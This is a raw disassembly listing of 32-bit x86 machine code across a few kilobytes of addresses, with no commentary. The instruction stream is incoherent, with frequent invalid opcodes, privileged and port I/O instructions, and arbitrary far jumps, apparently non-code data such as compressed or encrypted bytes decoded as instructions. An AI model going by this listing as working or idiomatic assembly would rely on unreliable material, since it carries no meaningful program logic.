  4223f6:	xchg   ebx,eax
  4223f7:	cld    
  4223f8:	dec    ebp
  4223f9:	arpl   WORD PTR [esi],bp
  4223fb:	pusha  
  4223fc:	adc    dh,cl
  4223fe:	fsubr  DWORD PTR [eax+0x7c]
  422401:	mov    tr3,edx
  422404:	pop    ebp
  422405:	loopne 0x42243d
  422407:	jp     0x4223b6
  422409:	rcl    DWORD PTR [ebx+ecx*2-0x2c0074e7],0x5b
  422411:	xor    esi,DWORD PTR [eax]
  422413:	inc    esp
  422414:	(bad)  
  422415:	loopne 0x42243e
  422417:	out    dx,al
  422418:	inc    edi
  422419:	sub    ecx,DWORD PTR [ecx+0x1d4e100a]
  42241f:	ins    BYTE PTR es:[edi],dx
  422420:	xchg   DWORD PTR [eax],esi
  422422:	mov    ah,0xa2
  422424:	int    0x5f
  422426:	popa   
  422427:	or     BYTE PTR [esi+ecx*8-0x79],al
  42242b:	mov    es,WORD PTR [edi+0x2f]
  42242e:	adc    al,0x53
  422430:	nop
  422431:	mov    ds:0x62aac2d9,al
  422436:	mov    ds:0xf325ed6e,eax
  42243b:	or     eax,0x7348c98b
  422440:	inc    ecx
  422441:	inc    ebx
  422442:	repnz outs dx,DWORD PTR ds:[esi]
  422444:	pop    esi
  422445:	push   edi
  422446:	and    dh,bl
  422448:	push   edx
  422449:	hlt    
  42244a:	nop
  42244b:	or     ecx,DWORD PTR [edi-0x7ff9c2c9]
  422451:	and    bl,BYTE PTR [edi]
  422453:	(bad)  
  422454:	xlat   BYTE PTR ds:[ebx]
  422455:	in     eax,0xf5
  422457:	icebp  
  422458:	add    al,0xee
  42245a:	scas   eax,DWORD PTR es:[edi]
  42245b:	push   edi
  42245c:	in     al,0xa9
  42245e:	xor    al,0x88
  422460:	sub    esi,DWORD PTR [ecx]
  422462:	in     al,0x62
  422464:	cmp    DWORD PTR [edx],edx
  422466:	loopne 0x4224be
  422468:	ret    
  422469:	loop   0x422448
  42246b:	outs   dx,DWORD PTR ds:[esi]
  42246c:	(bad)  
  42246d:	cdq    
  42246e:	mov    ah,0x66
  422470:	fsubr  QWORD PTR [ebx+0x6f]
  422473:	mov    ch,0xb3
  422475:	retf   0x89d8
  422478:	jecxz  0x4224a2
  42247a:	jbe    0x422444
  42247c:	repz push cs
  42247e:	in     al,0xc9
  422480:	leave  
  422481:	xchg   ecx,eax
  422482:	xor    eax,0xabdfcc7b
  422487:	retf   0x3af3
  42248a:	xchg   ebx,eax
  42248b:	jmp    0x4224a3
  42248d:	out    dx,al
  42248e:	mov    ds:0xe9c46bd3,eax
  422493:	pop    esi
  422494:	mov    al,0xd6
  422496:	int    0x1c
  422498:	xchg   ecx,eax
  422499:	cld    
  42249a:	mov    ds:0xc5c3029c,al
  42249f:	inc    edx
  4224a0:	adc    BYTE PTR [ebx],ah
  4224a2:	push   es
  4224a3:	scas   eax,DWORD PTR es:[edi]
  4224a4:	lock xor eax,0xce176dc
  4224aa:	cmc    
  4224ab:	inc    edi
  4224ac:	push   edi
  4224ad:	mov    cs,WORD PTR [esi-0x12]
  4224b0:	jne    0x422462
  4224b2:	loope  0x422509
  4224b4:	(bad)  
  4224b5:	pushf  
  4224b6:	pop    es
  4224b7:	lods   eax,DWORD PTR ds:[esi]
  4224b8:	add    eax,0x60613cd
  4224bd:	dec    edx
  4224be:	dec    edx
  4224bf:	jb     0x422465
  4224c1:	cmp    cl,BYTE PTR [edx-0x1a473d]
  4224c7:	popf   
  4224c8:	push   edi
  4224c9:	xchg   ecx,eax
  4224ca:	xchg   esp,eax
  4224cb:	and    ah,bh
  4224cd:	ret    0xb4b0
  4224d0:	not    BYTE PTR [eax]
  4224d2:	dec    edi
  4224d3:	mov    al,cl
  4224d5:	lea    eax,[ecx-0x62]
  4224d8:	stos   DWORD PTR es:[edi],eax
  4224d9:	sti    
  4224da:	mov    cl,0x24
  4224dc:	(bad)  
  4224dd:	fmul   QWORD PTR [ecx-0x6516379c]
  4224e3:	xchg   esp,eax
  4224e4:	mov    eax,0x33f63d8b
  4224e9:	sbb    bh,BYTE PTR [edx-0x7b]
  4224ec:	repnz push es
  4224ee:	jo     0x42248d
  4224f0:	mov    ah,0x87
  4224f2:	sub    DWORD PTR [ebp+edi*4+0x2ae57d3c],0xffffffe4
  4224fa:	je     0x4224e4
  4224fc:	push   ebx
  4224fd:	xor    al,cl
  4224ff:	stos   DWORD PTR es:[edi],eax
  422500:	aas    
  422501:	ins    DWORD PTR es:[edi],dx
  422502:	cmc    
  422503:	and    BYTE PTR [esi-0x4c],ch
  422506:	cmp    edi,DWORD PTR [edx]
  422508:	sub    BYTE PTR [ebx+0x4b],cl
  42250b:	pop    edx
  42250c:	mov    DWORD PTR [eax+0x407ec386],esi
  422512:	or     BYTE PTR es:[edx],al
  422515:	cdq    
  422516:	addr16 dec edx
  422518:	lea    esi,[ebx]
  42251a:	aaa    
  42251b:	fsubp  st(1),st
  42251d:	mov    bl,BYTE PTR [eax+edx*1]
  422520:	mov    ds:0x72059481,al
  422525:	shr    edi,cl
  422527:	xchg   esp,eax
  422528:	cmp    eax,0x8d932e34
  42252d:	scas   al,BYTE PTR es:[edi]
  42252e:	loop   0x42250b
  422530:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422532:	jnp    0x422527
  422534:	cmp    al,0x31
  422536:	pushf  
  422537:	jmp    0x1b507a75
  42253c:	in     eax,dx
  42253d:	in     eax,0x10
  42253f:	xchg   DWORD PTR [ecx],ebp
  422541:	cmc    
  422542:	cmp    al,0x78
  422544:	test   eax,0x48245ce5
  422549:	jecxz  0x4225c6
  42254b:	fs xchg ebx,eax
  42254d:	arpl   WORD PTR [eax-0x5f],bx
  422550:	arpl   WORD PTR [ecx-0x1],dx
  422553:	cld    
  422554:	xlat   BYTE PTR ds:[ebx]
  422555:	sahf   
  422556:	ud0    esi,eax
  422559:	adc    al,0xd0
  42255b:	adc    DWORD PTR [edi+0x501229df],0xc4060cd2
  422565:	xchg   esp,eax
  422566:	cmp    BYTE PTR [edx],bh
  422568:	popf   
  422569:	ja     0x4225d7
  42256b:	(bad)  
  42256c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256d:	imul   eax,esi,0xb3b4072a
  422573:	sub    dh,dh
  422575:	repnz (bad) 
  422577:	cmp    eax,0xd2c4ed96
  42257c:	shl    BYTE PTR [edi],0x82
  42257f:	pushf  
  422580:	leave  
  422581:	mov    ebp,0xa8972771
  422586:	xchg   esp,eax
  422587:	add    DWORD PTR [edx-0x66],0xd7e2a966
  42258e:	mov    cl,0xb8
  422590:	ins    DWORD PTR es:[edi],dx
  422591:	ins    BYTE PTR es:[edi],dx
  422592:	stos   BYTE PTR es:[edi],al
  422593:	add    eax,ebx
  422595:	adc    eax,0x3f49c9df
  42259a:	adc    ecx,eax
  42259c:	mov    bh,0xf9
  42259e:	push   0xbcc8687d
  4225a3:	xchg   ecx,eax
  4225a4:	mov    al,ds:0xab7e05c6
  4225a9:	dec    ebp
  4225aa:	or     cl,ah
  4225ac:	and    DWORD PTR [eax-0x7cbc378b],edx
  4225b2:	aas    
  4225b3:	pop    es
  4225b4:	push   0xd054a76f
  4225b9:	loope  0x42262f
  4225bb:	arpl   di,sp
  4225bd:	int3   
  4225be:	and    al,0x94
  4225c0:	dec    ebp
  4225c1:	jle    0x42257f
  4225c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225c4:	mov    edi,0x3b2c6acc
  4225c9:	loope  0x42256c
  4225cb:	mov    dl,0xf7
  4225cd:	jnp    0x422648
  4225cf:	stos   DWORD PTR es:[edi],eax
  4225d0:	or     cl,BYTE PTR [ecx]
  4225d2:	adc    eax,DWORD PTR [eax-0x13]
  4225d5:	out    0xc7,al
  4225d7:	mov    bh,BYTE PTR [ecx]
  4225d9:	retf   0xe0c5
  4225dc:	push   ebp
  4225dd:	(bad)  
  4225de:	ror    DWORD PTR [edx+0x2ec58a78],1
  4225e4:	xor    cl,BYTE PTR [esi+ebp*4+0x539f63cd]
  4225eb:	enter  0x7d0e,0x4e
  4225ef:	test   al,0xe2
  4225f1:	mov    esp,0x6c97cc23
  4225f6:	cmp    DWORD PTR [esi+edx*8-0x52],ebx
  4225fa:	or     BYTE PTR [esi+0x25911c17],cl
  422600:	pop    ds
  422601:	jae    0x4225d4
  422603:	daa    
  422604:	ins    DWORD PTR es:[edi],dx
  422605:	loop   0x422609
  422607:	pushf  
  422608:	mov    bl,0x6c
  42260a:	aam    0xe2
  42260c:	mov    al,ds:0x376a9e96
  422611:	lods   al,BYTE PTR ds:[esi]
  422612:	comiss xmm2,xmm4
  422615:	mov    eax,0x6467df3d
  42261a:	js     0x4225e8
  42261c:	ss sub eax,0x36a25fa
  422622:	outs   dx,BYTE PTR ds:[esi]
  422623:	push   esi
  422624:	mov    ecx,DWORD PTR [edi]
  422626:	(bad)  [esp+eax*2+0x73f735ab]
  42262d:	rol    BYTE PTR [edi-0x24],1
  422630:	or     DWORD PTR ds:0xfda33955,ecx
  422636:	or     al,0x8b
  422638:	cmp    BYTE PTR [esi+0x76],dl
  42263b:	push   cs
  42263c:	stos   BYTE PTR es:[edi],al
  42263d:	or     DWORD PTR [edx-0x47ec61e6],esp
  422643:	pop    es
  422644:	data16 repnz stc 
  422647:	int    0xab
  422649:	dec    eax
  42264a:	inc    ecx
  42264b:	dec    edx
  42264c:	test   DWORD PTR [edi+0x5564a533],ebp
  422652:	ins    BYTE PTR es:[edi],dx
  422653:	mov    ch,0xc1
  422655:	leave  
  422656:	std    
  422657:	mov    ah,0x18
  422659:	mov    ebp,edx
  42265b:	cmp    al,0x8b
  42265d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42265e:	mov    dh,0xde
  422660:	cmp    eax,0x77544e72
  422665:	add    DWORD PTR [eax],ecx
  422667:	ds mov ss:0x81520d14,eax
  42266e:	dec    esp
  42266f:	out    dx,al
  422670:	add    DWORD PTR [edi-0x46af9003],eax
  422676:	jbe    0x422627
  422678:	jge    0x42266e
  42267a:	je     0x4226ba
  42267c:	inc    edx
  42267d:	repnz mov dl,0xd4
  422680:	mov    dl,0x97
  422682:	lods   al,BYTE PTR ds:[esi]
  422683:	push   esp
  422684:	or     al,0x18
  422686:	mov    BYTE PTR [edi+0x5],bl
  422689:	sub    ax,0x57e0
  42268d:	popa   
  42268e:	or     eax,0x47ffd3d8
  422693:	xchg   ecx,eax
  422694:	jg     0x422689
  422696:	mov    ds:0xaf896b74,eax
  42269b:	push   ebx
  42269c:	fdiv   QWORD PTR [esi+esi*1-0x19]
  4226a0:	mov    eax,0x9a4b9d0f
  4226a5:	jmp    0x4226d3
  4226a7:	sub    ebp,eax
  4226a9:	or     dl,BYTE PTR [ebx+0x7ddb1683]
  4226af:	in     al,0x37
  4226b1:	inc    ebx
  4226b2:	and    edx,edi
  4226b4:	and    eax,eax
  4226b6:	pop    esi
  4226b7:	cld    
  4226b8:	test   BYTE PTR [ebx],bl
  4226ba:	je     0x4226fe
  4226bc:	mov    ebp,edx
  4226be:	call   0x9ffe7646
  4226c3:	cld    
  4226c4:	inc    edx
  4226c5:	ror    eax,1
  4226c7:	or     bl,BYTE PTR ds:0x57c230bb
  4226cd:	std    
  4226ce:	push   es
  4226cf:	shl    edi,cl
  4226d1:	call   0x2479:0x6cdb2d63
  4226d8:	mov    ah,0xac
  4226da:	sbb    al,0x42
  4226dc:	jle    0x4226a0
  4226de:	std    
  4226df:	xchg   esi,eax
  4226e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226e2:	inc    ebx
  4226e3:	in     eax,0x9c
  4226e5:	inc    edi
  4226e6:	shl    DWORD PTR [edi-0x59],1
  4226e9:	mov    al,0xa6
  4226eb:	mul    BYTE PTR [edi-0x35]
  4226ee:	xchg   edx,eax
  4226ef:	(bad)  
  4226f1:	in     al,dx
  4226f2:	sar    DWORD PTR [ecx+0x59cbe8f8],cl
  4226f8:	mov    ecx,0x84861ff1
  4226fd:	std    
  4226fe:	xchg   edx,eax
  4226ff:	shl    DWORD PTR [ebx],1
  422701:	imul   eax,DWORD PTR [edx-0x300d5207],0x79
  422708:	out    dx,eax
  422709:	addr16 pop eax
  42270b:	jmp    DWORD PTR ds:0x3f25e09f
  422711:	cdq    
  422712:	xchg   edi,edi
  422714:	aas    
  422715:	and    BYTE PTR [edx],ch
  422717:	xor    eax,0xb0d2e42a
  42271c:	outs   dx,DWORD PTR ds:[esi]
  42271d:	aas    
  42271e:	retf   0xe5b8
  422721:	jno    0x42270f
  422723:	jb     0x422703
  422725:	gs mov bh,0x8d
  422728:	xor    ebx,esp
  42272a:	push   0xea7a67b9
  42272f:	and    BYTE PTR [ecx-0x7a],ah
  422732:	push   ecx
  422733:	popf   
  422734:	adc    esi,eax
  422736:	dec    ebp
  422737:	cmp    ebx,esp
  422739:	retf   0x6757
  42273c:	mov    BYTE PTR [ebp-0x6d],bl
  42273f:	sar    DWORD PTR [edx+esi*2],0x3c
  422743:	lea    edx,[edi]
  422745:	xchg   edx,eax
  422746:	es (bad) 
  422748:	cld    
  422749:	cmp    eax,0xc7f29f30
  42274e:	leave  
  42274f:	js     0x422714
  422751:	mov    ah,0x62
  422753:	add    eax,0xc9a9c7d
  422758:	cmp    DWORD PTR [esi-0x5b1cd946],esi
  42275e:	inc    ebp
  42275f:	stc    
  422760:	mov    ecx,0x4a239b56
  422765:	xor    al,0x52
  422767:	popa   
  422768:	mov    eax,ds:0xa35cb9f1
  42276d:	outs   dx,BYTE PTR ds:[esi]
  42276e:	xor    eax,DWORD PTR [eax+0x2c89a9a5]
  422774:	mov    ebx,0x815f27eb
  422779:	(bad)  
  42277a:	and    BYTE PTR [ebp+0x4424c042],cl
  422780:	pop    edx
  422781:	push   esi
  422782:	nop
  422783:	push   0xfc8dd65c
  422788:	add    BYTE PTR [ebx-0x5a],ah
  42278b:	jae    0x422721
  42278d:	ins    DWORD PTR es:[edi],dx
  42278e:	dec    ebx
  42278f:	(bad)  
  422790:	mov    WORD PTR [edi-0xd],?
  422793:	ret    
  422794:	and    eax,0xa7d578ca
  422799:	aas    
  42279a:	sub    dh,BYTE PTR [eax-0x3d753fa0]
  4227a0:	xor    DWORD PTR [ebp-0x22],0x31dc6e48
  4227a7:	push   edx
  4227a8:	push   ebx
  4227a9:	ds fwait
  4227ab:	scas   al,BYTE PTR es:[edi]
  4227ac:	clc    
  4227ad:	test   BYTE PTR [edi-0x77b382e7],bl
  4227b3:	cmp    ch,bl
  4227b5:	pop    es
  4227b6:	mov    DWORD PTR [ebx-0x32],ebx
  4227b9:	lahf   
  4227ba:	hlt    
  4227bb:	jmp    0xcba5:0xe105de7b
  4227c2:	inc    ecx
  4227c3:	or     DWORD PTR [eax-0x4e83af61],eax
  4227c9:	idiv   DWORD PTR [edi+0x2a798e70]
  4227cf:	fwait
  4227d0:	inc    ebp
  4227d1:	mov    eax,ds:0xb07d0454
  4227d6:	ins    BYTE PTR es:[edi],dx
  4227d7:	pop    esp
  4227d8:	outs   dx,BYTE PTR ds:[esi]
  4227d9:	loop   0x42275b
  4227db:	clc    
  4227dc:	adc    dh,dl
  4227de:	dec    edi
  4227df:	xchg   DWORD PTR [ebx],esp
  4227e1:	xchg   esp,eax
  4227e2:	lock jp 0x422849
  4227e5:	clc    
  4227e6:	sub    esi,DWORD PTR [ecx+0x9ec8027]
  4227ec:	pop    edi
  4227ed:	cmp    dl,BYTE PTR ds:0xdeafdd4a
  4227f3:	repz (bad) 
  4227f5:	in     al,dx
  4227f6:	mov    WORD PTR [esi],es
  4227f8:	mov    cl,0xff
  4227fa:	js     0x42285e
  4227fc:	adc    eax,0xe117a2f6
  422801:	push   ss
  422802:	pushf  
  422803:	lods   al,BYTE PTR ds:[esi]
  422804:	shl    bl,1
  422806:	jno    0x4227fb
  422808:	ins    DWORD PTR es:[edi],dx
  422809:	ror    DWORD PTR [edi+edx*8+0x548b0cad],cl
  422810:	fmul   DWORD PTR [edi]
  422812:	aam    0xeb
  422814:	sub    al,0xdd
  422816:	inc    ebx
  422817:	out    0x7c,al
  422819:	cmp    BYTE PTR ds:0x820879d9,dl
  42281f:	jmp    0x3f57:0x5b5c97c8
  422826:	ja     0x42280b
  422828:	(bad)  
  422829:	stc    
  42282a:	push   ebp
  42282b:	inc    esi
  42282c:	test   BYTE PTR [esi],ah
  42282e:	aam    0xd
  422830:	jmp    0x88230c08
  422835:	pop    ebp
  422836:	ja     0x4227da
  422838:	mov    ah,0xd8
  42283a:	adc    DWORD PTR [edi-0x34],edx
  42283d:	fdivr  DWORD PTR [ebx]
  42283f:	mov    eax,ds:0x5da7a404
  422844:	adc    ah,al
  422846:	mov    esp,0xa60757f3
  42284b:	inc    eax
  42284c:	dec    ebp
  42284d:	mov    esi,0xdd3bcf21
  422852:	push   ds
  422853:	pop    ebx
  422854:	adc    DWORD PTR [edi-0x4af92621],0x23c76614
  42285e:	push   0x44
  422860:	ss out dx,al
  422862:	inc    edi
  422863:	aad    0xd7
  422865:	push   ss
  422866:	mov    al,0xfb
  422868:	out    dx,eax
  422869:	xchg   esp,eax
  42286a:	xor    esp,eax
  42286c:	xor    edx,DWORD PTR [edx*2+0x558dae11]
  422873:	mov    ds:0xb45f89b0,eax
  422878:	xchg   esi,eax
  422879:	cmp    al,0xcb
  42287b:	push   0xae9c2713
  422880:	add    dl,ch
  422882:	mov    bl,0x7
  422884:	test   BYTE PTR [edi+esi*1+0x4a],ch
  422888:	rcr    BYTE PTR ds:0x18a9edac,1
  42288e:	nop
  42288f:	pop    ss
  422890:	aas    
  422891:	(bad)  
  422892:	xor    dl,al
  422894:	push   eax
  422895:	sub    esp,0xc4b8fcd6
  42289b:	pop    ebp
  42289c:	fadd   DWORD PTR [edi+edi*4-0x55]
  4228a0:	inc    edx
  4228a1:	and    eax,0xfe674464
  4228a6:	or     eax,0xc31058f2
  4228ab:	out    0x8d,al
  4228ad:	dec    ebp
  4228ae:	imul   esi,eax,0xffffffce
  4228b1:	push   edx
  4228b2:	sbb    ebp,0xfffffff4
  4228b5:	mov    ebp,0x2d9e3d1
  4228ba:	int3   
  4228bb:	paddusb mm4,QWORD PTR [ecx-0x55]
  4228bf:	iret   
  4228c0:	pop    eax
  4228c1:	xor    bl,bh
  4228c3:	out    dx,al
  4228c4:	dec    eax
  4228c5:	cli    
  4228c6:	and    edi,ecx
  4228c8:	(bad)  
  4228c9:	sbb    DWORD PTR [ebp-0x2e72df7f],0xef40c446
  4228d3:	sub    DWORD PTR [edx],edx
  4228d5:	mov    BYTE PTR [edi-0x692a19d1],bh
  4228db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228dc:	inc    eax
  4228dd:	jae    0x42288f
  4228df:	fs and al,0xe
  4228e2:	(bad)  
  4228e4:	xchg   BYTE PTR ds:0xb4c91bc1,ch
  4228ea:	cmp    al,0x90
  4228ec:	mov    esi,0x5bd47f06
  4228f1:	les    esi,FWORD PTR ds:0x8ed086c8
  4228f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228f8:	jae    0x422974
  4228fa:	dec    edi
  4228fb:	in     eax,0xf1
  4228fd:	imul   DWORD PTR [ecx+0x766ae29]
  422903:	popa   
  422904:	or     eax,0x6825107c
  422909:	popf   
  42290a:	jl     0x4228bb
  42290c:	jge    0x422945
  42290e:	mov    ah,0x7c
  422910:	push   es
  422911:	jl     0x42295d
  422913:	xlat   BYTE PTR ds:[ebx]
  422914:	and    BYTE PTR [esi+0x76],0xaf
  422918:	leave  
  422919:	sbb    BYTE PTR [esi+esi*8+0x4d126f8f],bl
  422920:	push   ss
  422921:	and    eax,0x941b4692
  422926:	ror    DWORD PTR cs:[esp+esi*4-0x758d1cdf],0xe9
  42292f:	push   ebx
  422930:	pop    ecx
  422931:	aad    0x64
  422933:	pop    ecx
  422934:	imul   BYTE PTR [edx-0x3c492b57]
  42293a:	mov    edi,0x19fcf8ef
  42293f:	(bad)  
  422940:	jmp    FWORD PTR [edi+0x54]
  422943:	xor    ebx,esp
  422945:	test   ebx,edx
  422947:	fistp  QWORD PTR [edx]
  422949:	imul   eax,esi,0xffffffeb
  42294c:	sub    BYTE PTR [edx+ecx*4+0x4b1778ed],bl
  422953:	lods   al,BYTE PTR ds:[esi]
  422954:	arpl   dx,di
  422956:	cld    
  422957:	scas   eax,DWORD PTR es:[edi]
  422958:	sub    eax,0x1c4b0e80
  42295d:	(bad)  
  42295f:	xchg   ecx,eax
  422960:	test   BYTE PTR [ecx+0x60],dh
  422963:	sub    esp,0x9784993
  422969:	dec    esi
  42296a:	dec    edx
  42296b:	aas    
  42296c:	cmp    eax,0xdd2abb74
  422971:	sub    eax,0x5c6a5e00
  422976:	jmp    0xc52d8434
  42297b:	les    ecx,FWORD PTR [ebp+eax*2+0x6e]
  42297f:	or     dl,BYTE PTR [eax+0x7a751525]
  422985:	pop    es
  422986:	add    esp,DWORD PTR [ecx-0x2d]
  422989:	jne    0x422a02
  42298b:	ficomp WORD PTR [esi+0x51]
  42298e:	(bad)  
  42298f:	cld    
  422990:	push   ss
  422991:	(bad)  
  422992:	push   esp
  422993:	adc    si,WORD PTR [esi]
  422996:	add    al,0x33
  422999:	inc    BYTE PTR [ebx+eax*1-0x22]
  42299d:	shr    ch,cl
  42299f:	pop    ecx
  4229a0:	iret   
  4229a1:	sti    
  4229a2:	int    0x24
  4229a4:	outs   dx,BYTE PTR ds:[esi]
  4229a5:	mov    bl,0x23
  4229a7:	mov    dh,0x22
  4229a9:	into   
  4229aa:	lea    eax,[ebp-0x5e]
  4229ad:	stos   DWORD PTR es:[edi],eax
  4229ae:	inc    ebx
  4229af:	and    BYTE PTR [ecx-0x65175781],bl
  4229b5:	retf   
  4229b6:	(bad)  
  4229b7:	xchg   ebp,eax
  4229b8:	loope  0x4229c2
  4229ba:	loopne 0x4229ad
  4229bc:	data16 jp 0x4229fe
  4229bf:	fnstcw WORD PTR [ebp+0x73e4785c]
  4229c5:	jne    0x42297f
  4229c7:	mov    edx,0x4f44f857
  4229cc:	ror    dl,1
  4229ce:	and    DWORD PTR [edx-0x36],0xffffff98
  4229d2:	pop    esi
  4229d3:	add    al,0xb2
  4229d5:	lock sub eax,0xa9813758
  4229db:	jge    0x422a02
  4229dd:	aas    
  4229de:	jg     0x4229e2
  4229e0:	pop    edx
  4229e1:	loop   0x4229ba
  4229e3:	pop    edi
  4229e4:	test   esi,ebx
  4229e6:	mov    BYTE PTR [edi],bl
  4229e8:	xchg   DWORD PTR [eax-0x48d76417],edi
  4229ee:	or     DWORD PTR [ebx+0x5694b40f],edi
  4229f4:	arpl   dx,ax
  4229f6:	fisub  WORD PTR [eax-0x4244bebe]
  4229fc:	sbb    BYTE PTR [ebx],ch
  4229fe:	xchg   ecx,esi
  422a00:	pop    es
  422a01:	test   al,0xe9
  422a03:	fbstp  TBYTE PTR [eax+esi*8-0x7a3c00b8]
  422a0a:	dec    ecx
  422a0b:	sub    esp,edx
  422a0d:	(bad)  
  422a0e:	xlat   BYTE PTR ds:[ebx]
  422a0f:	push   DWORD PTR [ebp+0x48]
  422a12:	pusha  
  422a13:	aam    0x5d
  422a15:	aaa    
  422a16:	mov    al,0xfb
  422a18:	mov    dh,0x9
  422a1a:	data16 and al,0x1b
  422a1d:	outs   dx,DWORD PTR ds:[esi]
  422a1e:	mov    cs,WORD PTR [ebx-0x9]
  422a21:	push   ds
  422a22:	push   ebx
  422a23:	push   ss
  422a24:	xchg   ebx,eax
  422a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a26:	sbb    al,0x9c
  422a28:	mov    bl,0x9e
  422a2a:	pop    ds
  422a2b:	in     al,dx
  422a2c:	dec    DWORD PTR [eax+0x2c]
  422a2f:	push   0xd8c304c2
  422a34:	(bad)  
  422a36:	js     0x422a11
  422a38:	jo     0x4229dd
  422a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a3b:	pop    ebp
  422a3c:	push   es
  422a3d:	or     al,bh
  422a3f:	mov    ebp,DWORD PTR [edx+0x79]
  422a42:	sbb    BYTE PTR gs:[ecx+0x24],0x99
  422a47:	adc    DWORD PTR [edi+0x7a],esp
  422a4a:	loope  0x422a66
  422a4c:	(bad)  
  422a4d:	and    eax,0x84eb6357
  422a52:	mov    al,ds:0xa99996e4
  422a57:	mov    dl,0x21
  422a59:	jmp    0x422a5d
  422a5b:	dec    edx
  422a5c:	dec    ebp
  422a5d:	cmc    
  422a5e:	loop   0x422a8d
  422a60:	repz mov dl,0x1c
  422a63:	(bad)  
  422a65:	or     bh,bl
  422a67:	out    dx,eax
  422a68:	arpl   WORD PTR [ecx+ebp*4+0x2b],di
  422a6c:	mov    dl,BYTE PTR [esi+edx*1]
  422a6f:	xchg   esp,eax
  422a70:	dec    ebp
  422a71:	(bad)  
  422a72:	icebp  
  422a73:	dec    edx
  422a74:	mov    eax,0xb3dd3b58
  422a79:	addr16 jns 0x422a85
  422a7c:	adc    eax,0xb9a9d42
  422a81:	int3   
  422a82:	scas   eax,DWORD PTR es:[edi]
  422a83:	jb     0x422abf
  422a85:	sub    esi,ebx
  422a87:	push   esp
  422a88:	rcr    BYTE PTR [edi+0x4d],1
  422a8b:	imul   eax,DWORD PTR [eax+0x53b8b43d],0x130e06bf
  422a95:	fsub   QWORD PTR es:[eax]
  422a98:	cwde   
  422a99:	in     eax,dx
  422a9a:	sar    DWORD PTR [ecx+0x57],0x4b
  422a9e:	(bad)  
  422a9f:	inc    ebx
  422aa0:	imul   edx,DWORD PTR [edx-0x3f],0xffffff9e
  422aa4:	adc    ecx,DWORD PTR [ebp+0x611d0e66]
  422aaa:	in     al,dx
  422aab:	cmp    eax,0x2761fe12
  422ab0:	jne    0x422aa7
  422ab2:	sahf   
  422ab3:	mov    dh,0x33
  422ab5:	cmp    esi,DWORD PTR [esi-0x60]
  422ab8:	test   ah,ah
  422aba:	mov    ch,0x61
  422abc:	push   ebp
  422abd:	rol    esi,1
  422abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ac0:	jnp    0x422abb
  422ac2:	jecxz  0x422aaa
  422ac4:	jns    0x422b07
  422ac6:	and    eax,0x4392599c
  422acb:	mov    dl,0x8
  422acd:	dec    edx
  422ace:	xchg   esp,eax
  422acf:	push   0xb37d516
  422ad4:	outs   dx,BYTE PTR ds:[esi]
  422ad5:	or     ebx,DWORD PTR [ebx+esi*2]
  422ad8:	push   0x204bafcf
  422add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ade:	(bad)  
  422adf:	mov    ah,0x40
  422ae1:	xchg   esp,eax
  422ae2:	mov    ds:0x14aebb2d,eax
  422ae7:	mov    ecx,0xe6136f46
  422aec:	std    
  422aed:	stos   DWORD PTR es:[edi],eax
  422aee:	cmc    
  422aef:	push   ds
  422af0:	inc    esp
  422af1:	pop    edi
  422af2:	add    al,0xbe
  422af4:	lahf   
  422af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422af6:	xlat   BYTE PTR ds:[ebx]
  422af7:	sub    BYTE PTR [eax+0x17944424],0x68
  422afe:	xchg   bp,ax
  422b00:	or     edx,edx
  422b02:	fcomp  QWORD PTR [ecx-0x23]
  422b05:	les    edx,FWORD PTR [edx]
  422b07:	(bad)  
  422b08:	mov    esi,DWORD PTR [edx-0x585e52ee]
  422b0e:	dec    eax
  422b0f:	mov    edi,0xea9e7d35
  422b14:	sbb    ebx,ebp
  422b16:	es jnp 0x422b45
  422b19:	push   0xb117e05
  422b1e:	jb     0x422b94
  422b20:	and    al,0xad
  422b22:	sub    al,0x59
  422b24:	mov    cl,0xde
  422b26:	mov    al,ds:0x5ad95965
  422b2b:	adc    DWORD PTR [edi],edx
  422b2d:	xor    eax,DWORD PTR [edi]
  422b2f:	outs   dx,DWORD PTR ds:[esi]
  422b30:	std    
  422b31:	push   eax
  422b32:	adc    DWORD PTR [esp+eax*4-0x2f3fbe4c],esi
  422b39:	outs   dx,BYTE PTR ds:[esi]
  422b3a:	inc    ebx
  422b3b:	ds adc ecx,ecx
  422b3e:	int    0x7e
  422b40:	fadd   QWORD PTR ds:0x84d2fa56
  422b46:	or     eax,DWORD PTR [ecx]
  422b48:	jmp    0xb4bc:0x1d46c585
  422b4f:	xor    dh,BYTE PTR [edi-0x53]
  422b52:	leave  
  422b53:	mov    edi,0x5d84ac2e
  422b58:	mov    edx,0x6b772407
  422b5d:	lods   al,BYTE PTR ds:[esi]
  422b5e:	adc    edi,DWORD PTR [ecx+esi*4]
  422b61:	sbb    DWORD PTR [ebx+0x629807ca],ecx
  422b67:	xor    eax,0xe6c3c2f9
  422b6c:	add    esi,DWORD PTR [ecx]
  422b6e:	adc    dl,bh
  422b70:	mov    esp,0x37a0883f
  422b75:	loopne 0x422bc5
  422b77:	in     al,dx
  422b78:	dec    edi
  422b79:	xor    BYTE PTR [bx+di+0x46c8],al
  422b7e:	in     al,0x8e
  422b80:	or     BYTE PTR [esi],0xc9
  422b83:	repz loop 0x422b58
  422b86:	pop    esi
  422b87:	sbb    DWORD PTR cs:[esi],edx
  422b8a:	in     al,0xb0
  422b8c:	js     0x422b1a
  422b8e:	ds into 
  422b90:	inc    ebp
  422b91:	pop    ecx
  422b92:	imul   eax
  422b94:	inc    esi
  422b95:	pop    ebx
  422b96:	fwait
  422b97:	inc    eax
  422b98:	or     al,bl
  422b9a:	lods   eax,DWORD PTR ds:[esi]
  422b9b:	lock in eax,dx
  422b9d:	shr    BYTE PTR [bp+di],0xfa
  422ba1:	mov    ?,WORD PTR [eax-0x6b]
  422ba4:	fild   DWORD PTR [edx-0x2425c1c7]
  422baa:	rcr    BYTE PTR [ebp+eax*8+0x56],1
  422bae:	xchg   edi,eax
